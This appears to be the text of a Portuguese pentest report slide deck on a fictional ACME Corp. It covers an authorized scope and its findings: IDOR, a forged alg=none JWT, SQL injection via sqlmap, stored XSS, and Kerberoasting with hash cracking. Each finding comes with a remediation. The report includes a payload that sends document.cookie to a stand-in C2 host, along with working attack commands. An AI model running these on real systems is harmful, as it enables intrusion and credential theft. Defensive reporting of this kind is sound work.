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R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Suricatoos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F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FE3"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SURICATOOS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678"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Relatório Técnico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Avaliação de Segurança Ofensiva — ACME Corp (Web + AD)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C"/>
                </a:solidFill>
              </a:rPr>
              <a:t>6/12/2026, 3:10:27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4287. Avaliação de Segurança Ofensiva — ACME Corp (Web + AD)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[✅ 1. Reconhecimento e mapeamento da superfície](#-1-reconhecimento-e-mapeamento-da-superfície)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- [✅ 1.1. Enumeração de subdomínios](#-11-enumeração-de-subdomínios)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- [✅ 1.2. Fingerprinting de serviços](#-12-fingerprinting-de-serviços)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[✅ 2. Aplicação web: autenticação e controle de acesso](#-2-aplicação-web-autenticação-e-controle-de-acesso)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[✅ 3. Injeção e validação de entrada](#-3-injeção-e-validação-de-entrada)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[✅ 4. Infraestrutura interna e Active Directory](#-4-infraestrutura-interna-e-active-directory)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[✅ 5. Validação de impacto (cadeia de exploração)](#-5-validação-de-impacto-cadeia-de-exploração)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[❌ 6. Teste de stress de camada 7 (DoS)](#-6-teste-de-stress-de-camada-7-dos)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1. Reconhecimento e mapeamento da superfície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Mapear a superfície externa e interna autorizada da ACME Corp e priorizar vetores de maior risco.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Escopo autorizado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Domínios: `acme.example`, `*.acme.example`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Faixa interna: `10.20.0.0/16` (VPN de teste fornecida)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Janela: 02–06/jun, fora do horário comercial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Resumo: identificados 4 ativos expostos relevantes e 1 caminho de entrada para a rede interna.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1.1. Enumeração de subdomínios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Coleta passiva (CT logs, DNS) e ativa (bruteforce controlado).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Subdomínios vivos confirmados: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coleta passiva + resolução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 -d acme.example -silent | dnsx -silent -a -resp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loja.acme.example   A 203.0.113.20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api.acme.example    A 203.0.113.21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vpn.acme.example    A 203.0.113.30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1.2. Fingerprinting de serviços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Identificação de tecnologias e versões.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**loja.acme.example:** nginx 1.24, app Node.js/Express, JWT em cookie de sessão.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**api.acme.example:** REST atrás de nginx; rotas `/api/v1/orders`, `/api/v1/users`.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="13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TLS 1.2/1.3, sem vulnerabilidades de protocolo.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2. Aplicação web: autenticação e controle de acesso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Avaliar autenticação, gestão de sessão e autorização (IDOR/BOLA) na loja e na API.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Dois achados de alto impacto na camada de autorização e sessão.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2.1 — IDOR/BOLA em /api/v1/orders/{id} (Alto)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Um usuário autenticado consegue ler pedidos de outros clientes apenas trocando o id,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sem verificação de propriedade no servidor.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Sessão do usuário A (id de pedido próprio = 10231); acesso ao pedido de outro cliente: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https://api.acme.example/api/v1/orders/10232 \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"Authorization: Bearer $TOKEN_A" | jq '{id, customer, total, address}'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retorna dados de cliente DISTINTO (nome, endereço, itens, total)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Impacto: exposição de PII e histórico de compras de toda a base.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validar order.customer_id == session.user_id no servidor; preferir referências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indiretas (UUID por usuário) e testes de autorização por objeto.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2.2 — JWT aceitando alg=none (Crítico)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 API aceita tokens com cabeçalho {"alg":"none"}, permitindo forjar identidade/elevação.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 forjado (sem assinatura) elevando para role=admin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= {"alg":"none","typ":"JWT"}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= {"sub":"10231","role":"admin"}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aceito por api.acme.example -&gt; acesso a endpoints administrativos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fixar o algoritmo esperado (ex.: RS256) no verificador; rejeitar none;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rotacionar segredos e invalidar sessões emitidas.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3. Injeção e validação de entrada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Testar injeção (SQL/NoSQL), XSS e desserialização nos pontos de entrada da loja.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3.1 — SQL Injection boolean/time-based em /buscar (Crítico)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O parâmetro q é concatenado diretamente na query. Extração inferencial confirmada.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sqlmap -u "https://loja.acme.example/buscar?q=tenis" \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--batch --technique=BT --dbms=postgres --banner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 'q' is injectable (boolean-based, time-based)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consultas parametrizadas/prepared statements; ORM seguro; WAF como camada extra.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3.2 — XSS armazenado em avaliações de produto (Médio)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Payload persiste no comentário e executa no contexto de outros usuários.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src=x onerror="fetch('https://c2.teste/'+document.cookie)"&gt;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codificação de saída por contexto; CSP estrita; sanitização no servidor.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4. Infraestrutura interna e Active Directory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 partir do acesso interno autorizado (VPN), avaliar exposição do AD e caminhos de movimentação lateral.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4.1 — Kerberoasting de conta de serviço (Alto)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Conta de serviço svc_sql com SPN e senha fraca permitiu extração e quebra offline do hash.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GetUserSPNs.py acme.example/teste:'&lt;senha-lab&gt;' -dc-ip 10.20.10.5 -request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13100 svc_sql.hash rockyou.txt   # senha recuperada offline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senhas longas/aleatórias para contas de serviço (gMSA); monitorar TGS-REQ anômalos.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Achado 4.2 — SMB signing desabilitado (Médio)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Hosts sem assinatura SMB permitem relay de autenticação NTLM.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Remediação: habilitar/forçar SMB signing via GPO; desabilitar NTLM onde possível.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✅ 5. Validação de impacto (cadeia de exploração)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Demonstrar impacto de negócio encadeando os achados, sem ações destrutivas.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Cadeia demonstrada: SQLi (3.1) → vazamento de credenciais de aplicação → pivô para a rede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interna (VPN) → Kerberoasting (4.1) → comprometimento de conta privilegiada.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O resultado evidencia caminho plausível de exposição de toda a base de clientes e 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controle administrativo do domínio de teste. Nenhum dado de produção foi alterado ou exfiltrado;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as PoCs limitaram-se à leitura mínima necessária para comprovar o impacto.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❌ 6. Teste de stress de camada 7 (DoS)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Avaliar resiliência a DoS de aplicação.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Abortado conforme as regras de engajamento. Testes de negação de serviço estavam fora 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escopo autorizado para o ambiente compartilhado; a tarefa foi encerrada sem execução para preservar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</a:rPr>
              <a:t>a disponibilidade. Recomenda-se um teste dedicado em ambiente isolado.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Suricatoos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Suricatoos</dc:creator>
  <cp:lastModifiedBy>Suricatoos</cp:lastModifiedBy>
  <cp:revision>1</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-06-12T18:10:27Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-06-12T18:10:27Z</dcterms:modified>
</cp:coreProperties>
</file>